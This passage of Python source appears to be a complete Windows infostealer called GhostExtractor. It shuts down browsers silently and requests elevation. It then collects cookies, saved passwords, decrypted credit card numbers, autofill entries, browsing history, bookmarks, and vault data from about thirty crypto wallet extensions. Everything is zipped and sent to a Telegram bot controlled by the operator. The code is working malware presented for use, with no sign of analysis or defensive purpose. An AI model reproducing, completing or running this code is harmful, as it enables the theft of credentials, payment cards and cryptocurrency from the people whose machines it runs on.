        Scans for any directory containing a Cookies database,
        catches Yandex/Opera/Electron non-standard naming.
        """
        profiles = []
        try:
            for entry in os.scandir(base):
                if not entry.is_dir():
                    continue
                dirname = entry.name
                if dirname in ('Default', 'Guest Profile', 'System Profile'):
                    profiles.append(dirname)
                elif dirname.startswith('Profile '):
                    profiles.append(dirname)
                elif os.path.exists(os.path.join(entry.path, 'Cookies')) or \
                     os.path.exists(os.path.join(entry.path, 'Network', 'Cookies')):
                    profiles.append(dirname)
        except Exception:
            pass
        if not profiles:
            if ChromiumExtractor._find_cookie_db(base):
                profiles.append('')
        return profiles if profiles else ['Default']

    @staticmethod
    def _find_cookie_db(profile_path):
        """Locate the Cookies database within a profile directory."""
        candidates = [
            os.path.join(profile_path, 'Network', 'Cookies'),
            os.path.join(profile_path, 'Cookies'),
        ]
        return next((f for f in candidates if os.path.exists(f)), None)


class GeckoExtractor(BaseBrowserExtractor):
    """
    Extracts cookies from all Gecko-based browsers.

    Firefox family stores cookies as plaintext in moz_cookies.
    """

    def extract_all(self):
        """Discover and extract cookies from every Gecko browser profile."""
        for browser_name, profile_name, cookie_path in PathDiscovery.gecko():
            try:
                self._process_gecko(browser_name, cookie_path)
            except Exception:
                pass

    def _process_gecko(self, browser_name, cookie_path):
        """Extract cookies from a single Gecko profile."""
        with FileOps.temp_copy(cookie_path) as tmp:
            if not tmp:
                return
            rows = DatabaseOps.query(tmp, 'SELECT name, value, host FROM moz_cookies')
            batch = [
                {'host': host, 'name': nm, 'value': val}
                for nm, val, host in rows
                if val
            ]
            self._store(browser_name, batch)


class Exfiltrator:
    """Builds in-memory ZIP archive and sends via Telegram."""

    def __init__(self, token, chat_id):
        self._token   = token
        self._chat_id = chat_id

    def send(self, cookies, username, passwords=None, user_agents=None, extra_data=None):
        """Compress and send everything via Telegram."""

        if not (cookies or passwords or extra_data):
            return

        archive  = self._build_archive(cookies, passwords, user_agents, extra_data)
        total_ck = sum(len(v) for v in cookies.values())
        total_pw = sum(len(v) for v in (passwords or {}).values())
        total_cc = sum(len(d.get('credit_cards', [])) for d in (extra_data or {}).values())
        total_wl = sum(len(d.get('wallets', {})) for d in (extra_data or {}).values())
        timestamp = datetime.now().strftime('%Y/%m/%d %H:%M:%S')

        caption = (
            f'\U0001F464 {username}\n'
            f'\U0001F4C5 {timestamp}\n'
            f'\U0001F36A {total_ck} cookies\n'
            f'\U0001F511 {total_pw} passwords\n'
            f'\U0001F4B3 {total_cc} cards\n'
            f'\U0001FA99 {total_wl} wallets\n'
            f'\U0001F310 {len(cookies)} browsers'
        )

        for attempt in range(5):
            try:
                archive.seek(0)
                resp = requests.post(
                    f'https://api.telegram.org/bot{self._token}/sendDocument',
                    files={'document': (f'{username.lower()}_data.zip', archive, 'application/zip')},
                    data={'caption': caption, 'chat_id': self._chat_id},
                    timeout=60,
                )
                if resp.status_code == 200:
                    return
            except requests.exceptions.RequestException:
                time.sleep(min(2 ** attempt, 30))
            except Exception:
                break

    @staticmethod
    def _build_archive(cookies, passwords=None, user_agents=None, extra_data=None):
        """Build ZIP with all extracted data."""

        buf = io.BytesIO()
        with zipfile.ZipFile(buf, 'w', zipfile.ZIP_DEFLATED, compresslevel=9) as zf:

            for browser, entries in cookies.items():
                # Cookie txt files
                hosts = {}
                for entry in entries:
                    safe = ''.join(c for c in entry['host'] if c.isalnum() or c in '._-').strip() or 'unknown'
                    hosts.setdefault(safe, []).append(f"{entry['name']}={entry['value']};")
                for host, vals in hosts.items():
                    zf.writestr(f'{browser}/{host}.txt', ' '.join(vals))

                # Cookie-Editor JSON
                cookie_editor = []
                for entry in entries:
                    host = entry['host']
                    cookie_editor.append({
                        'domain':         host if host.startswith('.') else f".{host}",
                        'expirationDate': entry.get('expires', int(time.time()) + 31536000),
                        'hostOnly':       not host.startswith('.'),
                        'httpOnly':       entry.get('httponly', False),
                        'name':           entry['name'],
                        'path':           entry.get('path', '/'),
                        'sameSite':       entry.get('samesite', 'unspecified'),
                        'secure':         entry.get('secure', True),
                        'session':        False,
                        'storeId':        '0',
                        'value':          entry['value'],
                    })
                zf.writestr(f'{browser}/cookies.json', json.dumps(cookie_editor, indent=2))

            if passwords:
                for browser, entries in passwords.items():
                    if entries:
                        lines = [f"URL: {e['url']}\nUser: {e['username']}\nPass: {e['password']}\n{'─'*40}" for e in entries]
                        zf.writestr(f'{browser}/passwords.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/passwords.json', json.dumps(entries, indent=2))

            if extra_data:
                for browser, data in extra_data.items():

                    if data.get('credit_cards'):
                        cards = data['credit_cards']
                        lines = []
                        for c in cards:
                            lines.append(
                                f"Card: {c.get('number', 'N/A')}\n"
                                f"Name: {c.get('name', 'N/A')}\n"
                                f"Exp:  {c.get('month', '?')}/{c.get('year', '?')}\n"
                                f"{'─'*40}"
                            )
                        zf.writestr(f'{browser}/credit_cards.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/credit_cards.json', json.dumps(cards, indent=2))

                    if data.get('autofill'):
                        af = data['autofill']
                        lines = [f"{e['field']}: {e['value']} (used {e['count']}x)" for e in af[:500]]
                        zf.writestr(f'{browser}/autofill.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/autofill.json', json.dumps(af[:500], indent=2))

                    if data.get('history'):
                        hist = data['history']
                        lines = [f"{e.get('title', 'No title')}\n  {e['url']}\n  Visits: {e['visits']}" for e in hist[:2000]]
                        zf.writestr(f'{browser}/history.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/history.json', json.dumps(hist[:2000], indent=2))

                    if data.get('downloads'):
                        dl = data['downloads']
                        lines = [f"{e['path']}\n  From: {e['url']}\n  Size: {e['size']}" for e in dl[:500]]
                        zf.writestr(f'{browser}/downloads.txt', '\n'.join(lines))

                    if data.get('bookmarks'):
                        bm = data['bookmarks']
                        lines = [f"[{e.get('folder', '')}] {e['name']}\n  {e['url']}" for e in bm]
                        zf.writestr(f'{browser}/bookmarks.txt', '\n'.join(lines))
                        zf.writestr(f'{browser}/bookmarks.json', json.dumps(bm, indent=2))

                    if data.get('wallets'):
                        zf.writestr(f'{browser}/wallets.json', json.dumps(data['wallets'], indent=2))
                        for wname, wdata in data['wallets'].items():
                            if isinstance(wdata, dict) and 'vault' in str(wdata):
                                zf.writestr(f'{browser}/wallet_{wname}_vault.json', json.dumps(wdata, indent=2))

            if user_agents:
                zf.writestr('user_agents.json', json.dumps(user_agents, indent=2))

        buf.seek(0)
        return buf


class DataExtractor:
    """
    Extracts autofill, credit cards, history, downloads,
    bookmarks, and crypto wallet vaults from browser profiles.
    """

    WALLET_EXTENSIONS = {
        'metamask':         'nkbihfbeogaeaoehlefnkodbefgpgknn',
        'coinbase':         'hnfanknocfeofbddgcijnmhnfnkdnaad',
        'phantom':          'bfnaelmomeimhlpmgjnjophhpkkoljpa',
        'tronlink':         'ibnejdfjmmkpcnlpebklmnkoeoihofec',
        'trust':            'egjidjbpglichdcondbcbdnbeeppgdph',
        'okx':              'mcohilncbfahbmgdjkbpemcciiolgcge',
        'keplr':            'dmkamcknogkgcdfhhbddcghachkejeap',
        'bnb-chain':        'fhbohimaelbohpjbbldcngcnapndodjp',
        'braavos':          'jnlgamecbpmbajjfhmmmlhejkemejdma',
        'manta':            'enabgbdfcbaehmbigakijjabdpdnimlg',
        'math':             'afbcbjpbpfadlkmhmclhkeeodmamcflc',
        'ronin':            'fnjhmkhhmkbjkkabndcnnogagogbneec',
        'exodus':           'aholpfdialjgjfhomihkjbmgjidlcdno',
        'rabby':            'acmacodkjbdgmoleebolmdjonilkdbch',
        'brave-wallet':     'odbfpeeihdkbihmopkbjmoonfanlbfcl',
        'tokenpocket':      'mfgccjchihfkkindfppnaooecgfneiii',
        'bitget':           'jiidiaalihmmhddjgbnbgdffknnlceai',
        'sui':              'opcgpfmipidbgpenhmajoajpbobppdil',
        'leap':             'fcfcfllfndlomdhbehjjcoimbgofdncg',
        'station':          'aiifbnbfobpmeekipheeijimdpnlpgpp',
        'compass':          'anokgmphncpekkhclmingpimjmcooifb',
        'conflux':          'djhangpaibgoanolfdamjpigcaijdlah',
        'plug':             'cfbfdhimifdmdehjmkdobpcjfefblkjm',
        'coin98':           'aeachknmefphepccionboohckonoeemg',
        'terra-station':    'aiifbnbfobpmeekipheeijimdpnlpgpp',
        'xdefi':            'hmeobnfnfcmdkdcmlblgagmfpfboieaf',
        'clover':           'nhnkbkgjikgcigadomkphalanndcapjk',
        'yoroi':            'ffnbelfdoeiohenkjibnmadjiehjhajb',
        'solflare':         'bhhhlbepdkbapadjdcodbhkbmljfand',
        'slope':            'pocmplpaccanhmnllbbkpgfliimjahi',
    }

    CHROME_EPOCH_OFFSET = 11644473600

    @classmethod
    def extract_credit_cards(cls, profile_path, mk, mk20):
        """Extract credit card data from Web Data SQLite."""
        web_data = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(web_data):
            return []

        try:
            with FileOps.temp_copy(web_data) as tmp:
                if not tmp:
                    return []
                rows = DatabaseOps.query(tmp, '''
                    SELECT name_on_card, expiration_month, expiration_year,
                           card_number_encrypted, date_modified, origin,
                           billing_address_id
                    FROM credit_cards
                ''')
                cards = []
                for row in rows:
                    name = row[0] or ''
                    month = row[1] or 0
                    year = row[2] or 0
                    enc_number = row[3]
                    modified = row[4] or 0
                    origin = row[5] or ''

                    number = ''
                    if enc_number:
                        number = CookieDecryptor.decrypt(enc_number, mk, mk20)

                    if number or name:
                        cards.append({
                            'name':    name,
                            'number':  number,
                            'month':   month,
                            'year':    year,
                            'origin':  origin,
                        })
                return cards
        except Exception:
            return []

    @classmethod
    def extract_autofill(cls, profile_path):
        """Extract autofill form data from Web Data SQLite."""
        web_data = os.path.join(profile_path, 'Web Data')
        if not os.path.exists(web_data):
            return []

        try:
            with FileOps.temp_copy(web_data) as tmp:
                if not tmp:
                    return []
                rows = DatabaseOps.query(tmp, '''
                    SELECT name, value, count, date_last_used
                    FROM autofill
                    WHERE value != ''
                    ORDER BY count DESC
                ''')
                return [
                    {'field': r[0], 'value': r[1], 'count': r[2], 'last_used': r[3]}
                    for r in rows if r[0] and r[1]
                ]
        except Exception:
            return []

    @classmethod
    def extract_history(cls, profile_path, limit=5000):
        """Extract browsing history from History SQLite."""
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return []

        try:
            with FileOps.temp_copy(history_db) as tmp:
                if not tmp:
                    return []
                rows = DatabaseOps.query(tmp, f'''
                    SELECT url, title, visit_count, last_visit_time
                    FROM urls
                    ORDER BY last_visit_time DESC
                    LIMIT {limit}
                ''')
                results = []
                for url, title, visits, last_visit in rows:
                    ts = 0
                    if last_visit:
                        ts = max(0, (last_visit // 1000000) - cls.CHROME_EPOCH_OFFSET)
                    results.append({
                        'url':      url or '',
                        'title':    title or '',
                        'visits':   visits or 0,
                        'last_visit': ts,
                    })
                return results
        except Exception:
            return []

    @classmethod
    def extract_downloads(cls, profile_path, limit=1000):
        """Extract download history from History SQLite."""
        history_db = os.path.join(profile_path, 'History')
        if not os.path.exists(history_db):
            return []

        try:
            with FileOps.temp_copy(history_db) as tmp:
                if not tmp:
                    return []
                rows = DatabaseOps.query(tmp, f'''
                    SELECT target_path, tab_url, total_bytes,
                           start_time, end_time, mime_type
                    FROM downloads
                    ORDER BY start_time DESC
                    LIMIT {limit}
                ''')
                results = []
                for path, url, size, start, end, mime in rows:
                    st = max(0, (start // 1000000) - cls.CHROME_EPOCH_OFFSET) if start else 0
                    results.append({
                        'path':  path or '',
                        'url':   url or '',
                        'size':  size or 0,
                        'time':  st,
                        'mime':  mime or '',
                    })
                return results
        except Exception:
            return []

    @classmethod
    def extract_bookmarks(cls, profile_path):
        """Extract bookmarks from Bookmarks JSON file."""
        bm_file = os.path.join(profile_path, 'Bookmarks')
        if not os.path.exists(bm_file):
            return []

        try:
            with open(bm_file, 'r', encoding='utf-8') as f:
                data = json.loads(f.read())

            bookmarks = []
            cls._walk_bookmarks(data.get('roots', {}), bookmarks)
            return bookmarks
        except Exception:
            return []

    @classmethod
    def _walk_bookmarks(cls, node, results, folder=''):
        """Recursively walk bookmark tree."""
        if isinstance(node, dict):
            if node.get('type') == 'url':
                results.append({
                    'name':   node.get('name', ''),
                    'url':    node.get('url', ''),
                    'folder': folder,
                })
            children = node.get('children', [])
            if isinstance(children, list):
                name = node.get('name', folder)
                for child in children:
                    cls._walk_bookmarks(child, results, name)
            for key, val in node.items():
                if isinstance(val, dict) and key not in ('meta_info', 'sync_metadata'):
                    cls._walk_bookmarks(val, results, key)

    @classmethod
    def extract_wallets(cls, profile_path):
        """
        Extract crypto wallet vault data from browser extension LevelDB.

        Scans Local Extension Settings for known wallet extension IDs,
        then reads raw LevelDB files searching for vault/KeyringController data.
        Returns the raw encrypted vault blob — decryption requires the wallet password.
        """
        wallets = {}

        ext_settings = os.path.join(profile_path, 'Local Extension Settings')
        if not os.path.isdir(ext_settings):
            return wallets

        for wallet_name, ext_id in cls.WALLET_EXTENSIONS.items():
            ext_path = os.path.join(ext_settings, ext_id)
            if not os.path.isdir(ext_path):
                continue

            vault_data = cls._scan_leveldb_for_vault(ext_path)
            if vault_data:
                wallets[wallet_name] = vault_data

        return wallets

    @classmethod
    def _scan_leveldb_for_vault(cls, leveldb_path):
        """
        Scan raw LevelDB files for vault/encrypted key data.

        Searches .ldb and .log files for JSON patterns containing
        vault data, KeyringController, or encrypted key material.
        """
        patterns = [b'"vault"', b'KeyringController', b'"data"', b'"iv"', b'"salt"']
        vault_data = None

        try:
            for fname in os.listdir(leveldb_path):
                if not (fname.endswith('.ldb') or fname.endswith('.log')):
                    continue

                fpath = os.path.join(leveldb_path, fname)
                try:
                    with open(fpath, 'rb') as f:
                        content = f.read()

                    if b'"vault"' not in content and b'KeyringController' not in content:
                        continue

                    text = content.decode('utf-8', errors='ignore')

                    for marker in ['"vault":"', "'vault':'", '"KeyringController"']:
                        idx = text.find(marker)
                        if idx == -1:
                            continue

                        start = max(0, idx - 50)
                        chunk = text[start:start + 50000]

                        brace_start = chunk.find('{')
                        if brace_start == -1:
                            continue

                        depth = 0
                        end = brace_start
                        for i in range(brace_start, len(chunk)):
                            if chunk[i] == '{':
                                depth += 1
                            elif chunk[i] == '}':
                                depth -= 1
                                if depth == 0:
                                    end = i + 1
                                    break

                        candidate = chunk[brace_start:end]

                        try:
                            parsed = json.loads(candidate)
                            if any(k in str(parsed) for k in ['vault', 'data', 'iv', 'salt']):
                                vault_data = parsed
                                break
                        except json.JSONDecodeError:
                            if len(candidate) > 100:
                                vault_data = candidate
                                break

                except Exception:
                    continue

                if vault_data:
                    break

        except Exception:
            pass

        if not vault_data:
            try:
                for fname in os.listdir(leveldb_path):
                    fpath = os.path.join(leveldb_path, fname)
                    if os.path.isfile(fpath):
                        try:
                            with open(fpath, 'rb') as f:
                                raw = f.read()
                            if any(p in raw for p in patterns):
                                vault_data = {'raw_file': fname, 'size': len(raw), 'contains_vault': True}
                                break
                        except Exception:
                            continue
            except Exception:
                pass

        return vault_data


class ProcessKiller:
    """Silent process termination — no console windows, no taskkill."""

    TARGETS = {
        'chrome.exe', 'msedge.exe', 'brave.exe',
        'browser.exe', 'opera.exe', 'vivaldi.exe',
        'iridium.exe', 'chromium.exe', 'firefox.exe',
        'waterfox.exe', 'librewolf.exe', 'palemoon.exe',
        'basilisk.exe', 'floorp.exe',
    }

    @classmethod
    def kill_all(cls):
        """Terminate all browser processes using Win32 API."""
        try:
            import ctypes.wintypes

            PROCESS_TERMINATE = 0x0001
            PROCESS_QUERY_INFORMATION = 0x0400
            TH32CS_SNAPPROCESS = 0x00000002

            class PROCESSENTRY32(ctypes.Structure):
                _fields_ = [
                    ('dwSize', ctypes.c_ulong),
                    ('cntUsage', ctypes.c_ulong),
                    ('th32ProcessID', ctypes.c_ulong),
                    ('th32DefaultHeapID', ctypes.POINTER(ctypes.c_ulong)),
                    ('th32ModuleID', ctypes.c_ulong),
                    ('cntThreads', ctypes.c_ulong),
                    ('th32ParentProcessID', ctypes.c_ulong),
                    ('pcPriClassBase', ctypes.c_long),
                    ('dwFlags', ctypes.c_ulong),
                    ('szExeFile', ctypes.c_char * 260),
                ]

            kernel32 = ctypes.windll.kernel32
            snapshot = kernel32.CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0)

            if snapshot == -1:
                return

            entry = PROCESSENTRY32()
            entry.dwSize = ctypes.sizeof(PROCESSENTRY32)

            if kernel32.Process32First(snapshot, ctypes.byref(entry)):
                while True:
                    try:
                        name = entry.szExeFile.decode('utf-8', errors='ignore').lower()
                        if name in cls.TARGETS:
                            handle = kernel32.OpenProcess(
                                PROCESS_TERMINATE, False, entry.th32ProcessID
                            )
                            if handle:
                                kernel32.TerminateProcess(handle, 0)
                                kernel32.CloseHandle(handle)
                    except Exception:
                        pass

                    if not kernel32.Process32Next(snapshot, ctypes.byref(entry)):
                        break

            kernel32.CloseHandle(snapshot)
        except Exception:
            pass

        time.sleep(1)


class GhostExtractor:
    """Top-level orchestrator — cookies, passwords, cards, history, wallets."""

    def __init__(
        self, 
        tg_token, 
        tg_chat_id
    ):
        self._cookies   = {}
        self._passwords = {}
        self._extra     = {}
        self._lock      = threading.Lock()
        self._exfil     = Exfiltrator(tg_token, tg_chat_id)
        self._username  = Environment.USER

    def run(self):
        """Execute the full extraction and exfiltration pipeline."""

        ProcessKiller.kill_all()

        ChromiumExtractor(
            self._cookies, self._lock, self._passwords, self._extra
        ).extract_all()

        GeckoExtractor(self._cookies, self._lock).extract_all()

        user_agents = UserAgentExtractor.extract_all(self._cookies.keys())

        if self._cookies or self._passwords or self._extra:
            thread = threading.Thread(
                target = self._exfil.send,
                args = (self._cookies, self._username, self._passwords, user_agents, self._extra),
                daemon = True,
            )

            thread.start()
            time.sleep(3)

if __name__ == '__main__':
    if not Environment.is_admin():
        Environment.elevate()

    GhostExtractor(TG_TOKEN, TG_CHAT_ID).run()